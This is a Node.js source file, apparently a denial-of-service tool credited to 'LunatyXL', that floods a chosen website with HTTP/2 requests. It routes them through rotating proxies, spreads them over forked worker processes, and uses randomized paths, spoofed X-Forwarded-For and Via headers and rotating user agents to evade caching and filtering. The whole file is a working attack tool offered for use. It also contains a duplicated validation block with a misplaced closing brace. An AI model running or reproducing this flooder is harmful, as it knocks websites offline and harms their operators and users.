const url = require("url");
const fs = require("fs");
const http = require("http");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");

// adding error checks cuz why not 
if (process.argv.length < 8) {
  console.log('\x1b[34m%s\x1b[0m', 'made by LunatyXL'); 
  console.log('\x1b[31m%s\x1b[0m %s %s', 'Usage:', '\x1b[33mnode cms.js <METHOD> <URL> <proxy_list> <duration_s> <rate> <threads>', '\x1b[0m');
  process.exit(0);
}

const [, , method, targetURL, proxyFile, durationSec, rate, threadCount] = process.argv;

if (!fs.existsSync(proxyFile)) {
  console.log('\x1b[34m%s\x1b[0m', 'made by LunatyXL');
  console.log('\x1b[31m%s\x1b[0m', `Error: Proxy file '${proxyFile}' not found.`);
  process.exit(1);
}

if (!fs.existsSync("ua.txt")) {
  console.log('\x1b[34m%s\x1b[0m', 'made by LunatyXL');
  console.log('\x1b[31m%s\x1b[0m', `Error: User-agent file 'ua.txt' not found.`);
  process.exit(1);
}

const duration = Number(durationSec);
const rps = Number(rate);
const threads = Number(threadCount);

if (isNaN(duration) || duration <= 0) {
  console.log('\x1b[34m%s\x1b[0m', 'made by LunatyXL');
  console.log('\x1b[31m%s\x1b[0m', 'Error: <duration_s> must be a positive number.');
  process.exit(1);

if (isNaN(duration) || duration <= 0) {
  console.log('\x1b[34m%s\x1b[0m', 'made by LunatyXL');
  console.log('\x1b[31m%s\x1b[0m', 'Error: <duration_s> must be a positive number.');
  process.exit(1);
}

if (isNaN(rps) || rps <= 0) {
  console.log('\x1b[34m%s\x1b[0m', 'made by LunatyXL');
  console.log('\x1b[31m%s\x1b[0m', 'Error: <rate> must be a positive number.');
  process.exit(1);
}

if (isNaN(threads) || threads <= 0) {
  console.log('\x1b[34m%s\x1b[0m', 'made by LunatyXL');
  console.log('\x1b[31m%s\x1b[0m', 'Error: <threads> must be a positive number.');
  process.exit(1);
}

const parsed = url.parse(targetURL);
if (!parsed.protocol || !parsed.hostname) {
  console.log('\x1b[34m%s\x1b[0m', 'made by LunatyXL');
  console.log('\x1b[31m%s\x1b[0m', 'Error: Invalid URL format. Please include protocol (e.g., http:// or https://).');
  process.exit(1);
}

if (typeof method !== 'string' || !['GET', 'POST', 'PUT', 'DELETE'].includes(method.toUpperCase())) {
  console.log('\x1b[34m%s\x1b[0m', 'made by LunatyXL');
  console.log('\x1b[31m%s\x1b[0m', 'Error: Invalid METHOD. Supported methods are GET, POST, PUT, DELETE.');
  process.exit(1);
}

const proxies = fs.readFileSync(proxyFile, "utf-8")
  .replace(/\r/g, "")
  .split("\n")
  .filter(Boolean);

if (proxies.length === 0) {
  console.log('\x1b[34m%s\x1b[0m', 'made by LunatyXL');
  console.log('\x1b[31m%s\x1b[0m', `Error: Proxy file '${proxyFile}' is empty.`);
  process.exit(1);
}

const userAgents = fs.readFileSync("ua.txt", "utf-8")
  .replace(/\r/g, "")
  .split("\n")
  .filter(Boolean);

if (userAgents.length === 0) {
  console.log('\x1b[34m%s\x1b[0m', 'made by LunatyXL');
  console.log('\x1b[31m%s\x1b[0m', `Error: User-agent file 'ua.txt' is empty.`);
  process.exit(1);
}

function rand(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}
function randInt(max) {
  return Math.floor(Math.random() * max);
}
function randIP() {
  return `${randInt(255)}.${randInt(255)}.${randInt(255)}.${randInt(255)}`;
}
function randString(len) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from({ length: len }, () => chars.charAt(randInt(chars.length))).join("");
}
if (cluster.isPrimary) {
  console.log(`[gsl] By LunatyXL Starting ${threads} threads`);
  for (let i = 0; i < Number(threads); i++) cluster.fork();
  setTimeout(() => {
    console.log("[gsl finished.");
    process.exit(0);
  }, Number(duration) * 1000);
} else {
  function lmfao() {
    const proxy = rand(proxies);
    const [proxyHost, proxyPort] = proxy.split(":");
    const headers = {
      ":method": method,
      ":path": parsed.path + randString(8),
      ":scheme": "https",
      "host": parsed.host,
      "user-agent": rand(userAgents),
      "accept": rand([
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "*/*",
        "application/json, text/plain, */*;q=0.9",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml;q=0.9,application/xml;q=0.8,*/*;q=0.7"]),
      "accept-language": rand([
        "en-US,en;q=0.9",
        "en-GB,en;q=0.9",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "es-ES,es;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "zh-CN,zh;q=0.9,en;q=0.8",
        "ja-JP,ja;q=0.9,en;q=0.8",
        "en-US,en;q=0.9,es;q=0.8,fr;q=0.7"]),
      "accept-encoding": rand([
        "gzip, deflate, br",
        "gzip, deflate",
        "br",
        "gzip, br",
        "deflate",
        "gzip",
        "*"]),
      "cache-control": rand([
        "no-cache",
        "max-age=0",
        "no-store",
        "no-cache, no-store, must-revalidate",
        "public, max-age=31536000",
        "private, max-age=0",
        "must-revalidate"]),
      "x-forwarded-for": randIP(),
      "via": randIP(),
      "referer": rand(["https://www.google.com","https://check-host.net","https://www.bing.com","https://duckduckgo.com/","https://ads.google.com","https://www.wikipedia.org"]),
      "origin": "https://" + parsed.host
    };

    const tunnel = http.request({
      host: proxyHost, port: proxyPort,
      method: "CONNECT",
      path: `${parsed.host}:443`,
      timeout: 5000
    });

    tunnel.on("timeout", () => tunnel.destroy());
    tunnel.on("error", () => {});
    tunnel.on("connect", (res, socket) => {
      if (res.statusCode !== 200) return socket.destroy();

      const tlsConn = tls.connect({
        socket,
        servername: parsed.host,
        ALPNProtocols: ["h2"],
        rejectUnauthorized: false,
        timeout: 5000
      });

      tlsConn.on("timeout", () => tlsConn.destroy());
      tlsConn.on("error", () => tlsConn.destroy());
      tlsConn.on("secureConnect", () => {
        const client = http2.connect(`https://${parsed.host}`, {
          createConnection: () => tlsConn
        });
        client.on("error", () => client.close());

        for (let i = 0; i < rps; i++) {
          try {
            const req = client.request(headers);
            req.setEncoding("utf8");
            req.on("response", () => {});
            req.on("data", () => {});
            req.on("end", () => req.close());
            req.on("error", () => {});
            req.end();
          } catch (_) {}
        }
      });
    });

    tunnel.end();
  }

  setInterval(lmfao, 10);
}
}